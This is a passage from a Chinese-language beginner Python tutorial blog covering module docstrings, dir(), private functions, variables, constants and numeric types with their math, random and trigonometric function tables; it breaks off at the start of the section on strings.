<h4 id="4-3-author-、-doc"><a href="#4-3-author-、-doc" class="headerlink" title="4.3 __author__、__doc__"></a><font color="#3CB371" face="Comic sans MS">4.3 __author__、__doc__</font></h4><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>文档注释：</strong></font>任何模块代码的第一个字符串都被视为模块的文档注释；</font></p>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong><code>__doc__</code>：</strong></font>可以访问一个文件中的第一个单引号（1、2、3对）、双引号（1、2、3对）注释的文档。</font></p>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong><code>__author__</code>：</strong></font>可以将一个文件的作者名字赋给它。</font></p>
<br>

<p>应用示例如下：<br><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; a test module &#x27;</span> </span><br><span class="line"><span class="string">&#x27;fgbhjknml&#x27;</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&#x27;Directoree&#x27;</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(__doc__)</span><br><span class="line"><span class="built_in">print</span>(__doc__)</span><br><span class="line"><span class="built_in">print</span>(__author__)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">10</span></span><br><span class="line"> a test module</span><br><span class="line"> a test module</span><br><span class="line">Directoree</span><br></pre></td></tr></table></figure>


<br>

<h4 id="4-4-dir-函数"><a href="#4-4-dir-函数" class="headerlink" title="4.4 dir()函数"></a><font color="#3CB371" face="Comic sans MS">4.4 dir()函数</font></h4><blockquote>
<p><font face="Microsoft YaHei">内置的函数 dir() 可以<font color="#FF7F00"><strong>找到模块内定义的所有名称。以一个字符串列表的形式返回</strong></font> 。</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>无参数：</strong></font> 只能列举当前模块已经被定义的名字；</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>有参数：</strong></font> 参数只能是已经引用的模块名字，不能为自身名字，否则会报错。</font></p>
</blockquote>
<br>

<p>举例子说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test3.py</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; a test module &#x27;</span> </span><br><span class="line"><span class="string">&#x27;fgbhjknml&#x27;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Directoree&#x27;</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(__doc__)</span><br><span class="line"><span class="built_in">print</span>(__author__)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"> a test module</span><br><span class="line">Directoree</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__author__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test3.py</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> test3  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(test3))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;__author__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;__author__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>]</span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="五-非公开函数"><a href="#五-非公开函数" class="headerlink" title="五. 非公开函数"></a><font color="#FF6347" face="Comic sans MS">五. 非公开函数</font></h3><blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</strong></font>。</p>
</blockquote>
<p><font face="Microsoft YaHei">类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；<br></font><br><font face="Microsoft YaHei"></font></p>
<p><font face="Microsoft YaHei">之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</font></p>
<p>private函数或变量不应该被别人引用，那它们有什么用呢？请看例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_1</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_2</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hi, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greeting</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_1(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_2(name)</span><br></pre></td></tr></table></figure>

<br>


<p><font face="Microsoft YaHei">我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：<br></font></p>
<p><font face="Microsoft YaHei"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。</strong><br></font></p>
<hr>
<hr>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-变量和数据类型</title>
    <url>/post/Python-Variables-DataTypes/</url>
    <content><![CDATA[<p>定义一个变量就是定义了一个指针！  ٩(ˊᗜˋ*)و<br>字符串内容很多，就很烦(っ ̯ -｡)</p>
<span id="more"></span>


<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>变量和数据类型</font> </center>

<br>

<br>

<h3 id="一-变量"><a href="#一-变量" class="headerlink" title="一. 变量"></a><font color="#FF6347" face="Comic sans MS">一. 变量</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、关于变量</strong></font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">变量存储在内存中的值。这就意味着在创建变量时会<strong>在内存中开辟一个空间</strong>。</font></li>
<li><font face="Comic sans MS">基于变量的数据类型，解释器会分配指定内存，并决定什么数据可以被存储在内存中。</font></li>
<li><font face="Comic sans MS">Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</font></li>
<li><font face="Comic sans MS">在 Python 中，变量就是变量，它没有类型，我们所说的”类型”是变量所指的内存中对象的类型。</font></li>
</ol>
</blockquote>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、变量的赋值</strong></font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">Python 中的变量赋值<font color="#FF7F00"><strong>不需要类型声明</strong></font>。</font></li>
<li><font face="Comic sans MS">每个变量在内存中创建，都包括变量的标识，名称和数据这些信息。</font></li>
<li><font face="Comic sans MS">每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</font></li>
<li><font face="Comic sans MS">变量的赋值分为：<font color="#FF7F00"><strong>单个变量赋值</strong></font>和<font color="#FF7F00"><strong>多个变量赋值</strong></font> </font></li>
</ol>
</blockquote>
<br>

<p><font face="Comic sans MS"><strong>单个变量赋值：</strong>使用等号（&#x3D;）运算符左边是一个变量名,等号（&#x3D;）运算符右边是存储在变量中的值。例如：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;Hello Python world!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><font face="Comic sans MS">我们添加了一个名为message的<strong>变量</strong>。每个变量都存储了一个<strong>值</strong>——与变量相关联的信息。在这里，存储的值为文本“Hello Python world!”。</font></p>
</blockquote>
<br>

<p><font face="Comic sans MS"><strong>多个变量赋值：</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = b = c = <span class="number">1</span></span><br><span class="line"><span class="comment">#以上实例，创建一个整型对象，值为1，三个变量被分配到相同的内存空间上。</span></span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS">或者</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;john&quot;</span></span><br><span class="line"><span class="comment">#以上实例，两个整型对象 1 和 2 分别分配给变量 a 和 b，字符串对象 &quot;john&quot; 分配给变量 c。</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>三、变量的命名和使用</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>请务必牢记下述有关变量的规则：</strong></font></p>
</blockquote>
<ol>
<li><font face="Comic sans MS">变量名只能包含<font color="#FF7F00"><strong>字母、数字</strong>和<strong>下划线</strong></font>。变量名可以字母或下划线打头，但不能以数字打头，例如，可将变量命名为message_1，但不能将其命名为1_message。 </font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>变量名不能包含空格</strong></font>，但可使用下划线来分隔其中的单词。例如，变量名greeting_message可行，但变量名greeting message会引发错误。</font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>不要将Python关键字和函数名用作变量名</strong></font>，即不要使用Python保留用于特殊用途的单词，如print。</font></li>
<li><font face="Comic sans MS">变量名应既简短又具有描述性。例如，name比n好，student_name比s_n好，name_length比length_of_persons_name好。</font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>慎用小写字母l和大写字母O</strong></font>，因为它们可能被人错看成数字1和0。</font></li>
<li><font face="Comic sans MS">注意：就目前而言，<font color="#FF7F00"><strong>应使用小写的Python变量名</strong></font>。在变量名中使用大写字母虽然不会导致错误，但避免使用大写字母是个不错的主意。</font></li>
</ol>
<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>四、变量是一种动态语言</strong></font><br>&amp;emsp;<br>代码示例：<br><font color="#00B2EE"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a = <span class="number">123</span> <span class="comment"># a是整数</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = <span class="string">&#x27;ABC&#x27;</span> <span class="comment"># a变为字符串</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">123</span> </span><br><span class="line">ABC</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS">这种变量本身类型不固定的语言称之为<font color="red"><strong>动态语言</strong></font>，与之对应的是<font color="red"><strong>静态语言</strong></font>。和静态语言相比，<strong>动态语言更灵活</strong>，就是这个原因。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下（&#x2F;&#x2F; 表示注释）：</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>; <span class="comment">// a是整数类型变量</span></span><br><span class="line">a = <span class="string">&quot;ABC&quot;</span>; <span class="comment">// 错误：不能把字符串赋给整型变量</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>五、Python的变量是Python的指针</strong></font> </p>
<p>可参考：<font color="#00B2EE">[<a href="https://www.cnblogs.com/hzwsj/p/5777973.html">一切都是对象，一切都是指针，一切都是东西（python的编程哲学）</a>]</font><br>&amp;emsp;<br>如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">5</span></span><br><span class="line">a=<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line"><span class="number">1769134320</span> </span><br><span class="line"><span class="number">1769134320</span> </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS">我们分别查一下他们的内存地址，发现地址是一样的。</font></p>
<blockquote>
<p><font face="Comic sans MS"><strong>于是我们可以这样理解：</strong></font></p>
</blockquote>
<ol>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>python把一切数据，一切的一切都看作对象，在python中，没有变量，只有指针，要说变量，也是指针变量</strong></font>。</font></li>
<li><font face="Comic sans MS">这样的变量还有如：<strong>列表</strong>，<strong>字典的值</strong>。</font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>但是字符串，数字等类型的变量，字典的键就是传值使用，不是指针，而是不可再改变的值</strong></font>。</font></li>
</ol>
<p>&amp;emsp;<br><strong>举例子</strong><br><font color="#00B2EE">例子1：</font>当我们写：<br><font color="#00B2EE"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;ABC&#x27;</span></span><br></pre></td></tr></table></figure>


<p><font face="Comic sans MS">时，Python解释器干了两件事情：</font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">在内存中创建了一个’ABC’的字符串；</font></li>
<li><font face="Comic sans MS">在内存中创建了一个名为a的变量，<strong>并把它指向’ABC’</strong></font></li>
</ol>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE">例子2：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line">b = a</span><br><span class="line">a = <span class="string">&#x27;XYZ&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">ABC </span><br></pre></td></tr></table></figure>

<br>

<p><font face="Comic sans MS">最后一行打印出变量b的内容到底是**<code>&#39;ABC&#39;</code><strong>呢还是</strong><code>&#39;XYZ&#39;</code><strong>？如果从数学意义上理解，就会错误地得出</strong><code>b</code><strong>和</strong><code>a</code><strong>相同，也应该是</strong><code>&#39;XYZ&#39;</code><strong>，但实际上</strong><code>b</code><strong>的值是</strong><code>&#39;ABC&#39;</code>**，让我们一行一行地执行代码，就可以看到到底发生了什么事：</font></p>
<ol>
<li><font face="Comic sans MS">执行a &#x3D; ‘ABC’，解释器创建了字符串’ABC’和变量a，**并把a指向’ABC’**：</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c760234f3b42.png" alt="1.png"></p>
<ol start="2">
<li><font face="Comic sans MS">执行b &#x3D; a，解释器创建了变量b，并把b指向a指向的字符串’ABC’：</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c7602fa3c6f7.png" alt="0 (1).png"></p>
<ol start="3">
<li><font face="Comic sans MS">执行a &#x3D; ‘XYZ’，解释器创建了字符串’XYZ’，并把a的指向改为’XYZ’，但b并没有更改：</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c7603411d5fc.png" alt="0 (2).png"></p>
<p><font face="Comic sans MS">所以，最后打印变量b的结果自然是’ABC’了。</font></p>
<br>
&emsp;

<h3 id="二-常量"><a href="#二-常量" class="headerlink" title="二. 常量"></a><font color="#FF6347" face="Comic sans MS">二. 常量</font></h3><p><font face="Comic sans MS">所谓常量就是不能变的变量，比如常用的数学常数π就是一个常量。在Python中，<strong>通常用全部大写的变量名表示常量</strong>：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PI = <span class="number">3.14159265359</span></span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS"><font color="#FF7F00"><strong>但事实上PI仍然是一个变量，Python根本没有任何机制保证PI不会被改变</strong></font>，所以，用全部大写的变量名表示常量只是一个习惯上的用法，如果你一定要改变变量PI的值，也没人能拦住你。</font></p>
<p><font color="#FF7F00"></font></p>
<h3 id="三-数据类型"><a href="#三-数据类型" class="headerlink" title="三. 数据类型"></a><font color="#FF6347" face="Comic sans MS">三. 数据类型</font></h3><p><font face="Comic sans MS"><strong>标准数据类型</strong></p>
<p>在内存中存储的数据可以有多种类型。</p>
<p>Python 定义了一些标准类型，用于存储各种类型的数据。</font></p>
<blockquote>
<p><font face="Comic sans MS">Python<font color="#FF7F00"><strong>有五个标准</strong></font>的数据类型：</font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">Numbers（数字）</font></li>
<li><font face="Microsoft YaHei">String（字符串）</font></li>
<li><font face="Sans-serif">List（列表）</font></li>
<li><font face="Sans-serif">Tuple（元组）</font></li>
<li><font face="Sans-serif">Dictionary（字典）</font></li>
</ol>
<h4 id="3-1-数字运算和函数"><a href="#3-1-数字运算和函数" class="headerlink" title="3.1 数字运算和函数"></a><font color="#3CB371" face="Comic sans MS">3.1 数字运算和函数</font></h4><p><font color="#00B2EE" face="Comic sans MS"><strong>一、整数的定义和基础知识</strong></font> </p>
<ol>
<li><p><font face="Comic sans MS"><font color="#FF7F00"><strong>Python可以处理任意大小的整数，当然包括负整数</strong></font>，在程序中的表示方法和数学上的写法一模一样，例如：1，100，-8080，0，等等。</font></p>
</li>
<li><p><font face="Comic sans MS">计算机由于使用二进制，所以，有时候用<font color="#FF7F00"><strong>十六进制表示整数</strong></font>比较方便，十六进制用0x前缀和0-9，a-f表示，例如：0xff00，0xa5b4c3d2，等等。</font></p>
</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、整数运算</strong></font> </p>
<p><font face="Comic sans MS">在Python中，可对整数执行加（**<code>+</code><strong>）减（</strong><code>-</code><strong>）乘（</strong><code>*</code><strong>）除（</strong><code>/</code>**）平方（<code>**</code>）取余（<code>%</code>）运算。</font></p>
<br>

<p><font face="Comic sans MS"><font color="red"><strong>注意事项：</strong></font> </font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">Python使用<font color="#FF7F00"><strong>两个乘号表示乘方运算：</strong></font><code>3 ** 2==9</code></font></li>
<li><font face="Comic sans MS">Python<font color="#FF7F00"><strong>整数的除法得到的结果是精确的</strong></font>。在Python中，有两种除法：</font><ol>
<li><font face="Comic sans MS">一种除法是<code>/</code>(结果是浮点数)</font></li>
<li><font face="Comic sans MS">另一种是除法是<code>//</code>，称为地板除(两个整数的除法仍然是整数) </font></li>
</ol>
</li>
<li><font face="Comic sans MS">因为**<code>//</code>**除法只取结果的整数部分，所以Python还提供一个余数运算(<code>%</code>)，可以得到两个整数相除的余数。</font></li>
</ol>
</blockquote>
<p>&amp;emsp;<br>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span>/<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a=<span class="number">10</span>//<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a=<span class="number">10</span>%<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运算结果：</span><br><span class="line"><span class="number">3.3333333333333335</span> </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">1</span> </span><br></pre></td></tr></table></figure>


<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、Number 类型转换</strong></font> </p>
<p>||<br>:-|:-|<br>int(x [,base ])         |将x转换为一个整数<br>long(x [,base ])        |将x转换为一个长整数<br>float(x )               |将x转换到一个浮点数<br>complex(real [,imag ])  |创建一个复数<br>str(x )                 |将对象 x 转换为字符串<br>repr(x )                |将对象 x 转换为表达式字符串<br>eval(str )              |用来计算在字符串中的有效Python表达式,并返回一个对象<br>tuple(s )               |将序列 s 转换为一个元组<br>list(s )                |将序列 s 转换为一个列表<br>chr(x )                 |将一个整数转换为一个字符<br>unichr(x )              |将一个整数转换为Unicode字符<br>ord(x )                 |将一个字符转换为它的整数值<br>hex(x )                 |将一个整数转换为一个十六进制字符串<br>oct(x )                 |将一个整数转换为一个八进制字符串  </p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>四、数学函数</strong></font> </p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">返回值 ( 描述 )</th>
</tr>
</thead>
<tbody><tr>
<td align="left">abs(x)</td>
<td align="left">返回数字的绝对值，如abs(-10) 返回 10</td>
</tr>
<tr>
<td align="left">ceil(x)</td>
<td align="left">返回数字的上入整数，如math.ceil(4.1) 返回 5</td>
</tr>
<tr>
<td align="left">cmp(x, y)</td>
<td align="left">如果 x &lt; y 返回 -1, 如果 x &#x3D;&#x3D; y 返回 0, 如果 x &gt; y 返回 1</td>
</tr>
<tr>
<td align="left">exp(x)</td>
<td align="left">返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td>
</tr>
<tr>
<td align="left">fabs(x)</td>
<td align="left">返回数字的绝对值，如math.fabs(-10) 返回10.0</td>
</tr>
<tr>
<td align="left">floor(x)</td>
<td align="left">返回数字的下舍整数，如math.floor(4.9)返回 4</td>
</tr>
<tr>
<td align="left">log(x)</td>
<td align="left">如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td>
</tr>
<tr>
<td align="left">log10(x)</td>
<td align="left">返回以10为基数的x的对数，如math.log10(100)返回 2.0</td>
</tr>
<tr>
<td align="left">max(x1, x2,…)</td>
<td align="left">返回给定参数的最大值，参数可以为序列。</td>
</tr>
<tr>
<td align="left">min(x1, x2,…)</td>
<td align="left">返回给定参数的最小值，参数可以为序列。</td>
</tr>
<tr>
<td align="left">modf(x)</td>
<td align="left">返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td>
</tr>
<tr>
<td align="left">pow(x, y)</td>
<td align="left">x**y 运算后的值。</td>
</tr>
<tr>
<td align="left">round(x [,n])</td>
<td align="left">返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。</td>
</tr>
<tr>
<td align="left">sqrt(x)</td>
<td align="left">返回数字x的平方根</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>五、随机数函数</strong></font> </p>
<p><font face="Comic sans MS">随机数可以用于数学，游戏，安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。</font></p>
<p>Python包含以下常用随机数函数：</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">choice(seq)</td>
<td align="left">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，<br>从0到9中随机挑选一个整数。</td>
</tr>
<tr>
<td align="left">randrange</td>
<td align="left">([start,] stop [,step])    从指定范围内，按指定基数递增的集合中获取一个随机数，<br>基数缺省值为1</td>
</tr>
<tr>
<td align="left">random()</td>
<td align="left">随机生成下一个实数，它在[0,1)范围内。</td>
</tr>
<tr>
<td align="left">seed([x])</td>
<td align="left">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，<br>Python会帮你选择seed。</td>
</tr>
<tr>
<td align="left">shuffle(lst)</td>
<td align="left">将序列的所有元素随机排序</td>
</tr>
<tr>
<td align="left">uniform(x, y)</td>
<td align="left">随机生成下一个实数，它在[x,y]范围内。</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>六、三角函数</strong></font> </p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">acos(x)</td>
<td align="left">返回x的反余弦弧度值。</td>
</tr>
<tr>
<td align="left">asin(x)</td>
<td align="left">返回x的反正弦弧度值。</td>
</tr>
<tr>
<td align="left">atan(x)</td>
<td align="left">返回x的反正切弧度值。</td>
</tr>
<tr>
<td align="left">atan2(y, x)</td>
<td align="left">返回给定的 X 及 Y 坐标值的反正切值。</td>
</tr>
<tr>
<td align="left">cos(x)</td>
<td align="left">返回x的弧度的余弦值。</td>
</tr>
<tr>
<td align="left">hypot(x, y)</td>
<td align="left">返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td>
</tr>
<tr>
<td align="left">sin(x)</td>
<td align="left">返回的x弧度的正弦值。</td>
</tr>
<tr>
<td align="left">tan(x)</td>
<td align="left">返回x弧度的正切值。</td>
</tr>
<tr>
<td align="left">degrees(x)</td>
<td align="left">将弧度转换为角度,如degrees(math.pi&#x2F;2) ， 返回90.0</td>
</tr>
<tr>
<td align="left">radians(x)</td>
<td align="left">将角度转换为弧度</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>七、数学常量</strong></font></p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pi</td>
<td align="left">数学常量 pi（圆周率，一般以π来表示）</td>
</tr>
<tr>
<td align="left">e</td>
<td align="left">数学常量 e，e即自然常数（自然常数）。</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>八、 range()函数</strong><br></font></p>
<p><font face="Comic sans MS">Python3 range() 函数返回的是一个可迭代对象（类型是对象），而不是列表类型， 所以打印的时候不会打印列表。<br></font></p>
<p><font face="Comic sans MS">Python3 list() 函数是对象迭代器，可以把range()返回的可迭代对象转为一个列表，返回的变量类型为列表。<br></font></p>
<p><font face="Comic sans MS">Python2 range() 函数返回的是列表。<br></font></p>
<p><font face="Comic sans MS"><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-built-in-functions.html">Python3 内置函数</a>]</font></font>&amp;emsp;<font face="Comic sans MS"><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-func-range.html">Python3 range() 函数用法</a>]</font><br></font></p>
<br>

<p><strong>函数语法：</strong><br><font color="#FF7F00"><strong>range(stop)</strong></font><br><font color="#FF7F00"><strong>range(start, stop[, step])</strong></font></p>
<br>

<blockquote>
<p><strong>参数说明：</strong><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>start:</strong></font> 计数从 start开始。默认是从 0 开始。例如range（5）等价于range（0， 5）;</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>stop:</strong></font> 计数到 stop 结束，但不包括 stop。例如：range（0， 5） 是[0, 1, 2, 3, 4]没有5</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>step：</strong></font>步长，默认为1。例如：range（0， 5） 等价于 range(0, 5, 1)</font></p>
</blockquote>
<br>

<br>

<h4 id="3-2-浮点数"><a href="#3-2-浮点数" class="headerlink" title="3.2 浮点数"></a><font color="#3CB371" face="Comic sans MS">3.2 浮点数</font></h4><ol>
<li><p><font face="Comic sans MS">浮点数也就是小数，之所以称为浮点数，<strong>是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的</strong>，比如，1.23x10^9和12.3x10^8是完全相等的。浮点数可以用数学写法，如**<code>1.23</code><strong>，</strong><code>3.14</code><strong>，</strong><code>-9.01</code><strong>，等等。但是对于很大或很小的浮点数，就必须用科学计数法表示，</strong>把10用e替代<strong>，1.23x109就是</strong><code>1.23e9</code><strong>，或者</strong><code>12.3e8</code><strong>，0.000012可以写成</strong><code>1.2e-5</code>**，等等。</font></p>
</li>
<li><p><font face="Comic sans MS">整数和浮点数在计算机内部存储的方式是不同的，整数运算永远是精确的（除法难道也是精确的？是的！），而浮点数运算则可能会有四舍五入的误差。</font></p>
</li>
</ol>
<br>

<h4 id="3-3-字符串"><a href="#3-3-字符串" class="headerlink" title="3.3 字符串"></a><font color="#3CB371" face="Comic sans MS">3.3 字符串</font></h4><h5 id="1-定义字符串并输出"><a href="#1-定义字符串并输出" class="headerlink" title="1.定义字符串并输出"></a><font color="#00B2EE" face="Comic sans MS">1.定义字符串并输出</font></h5><ol>
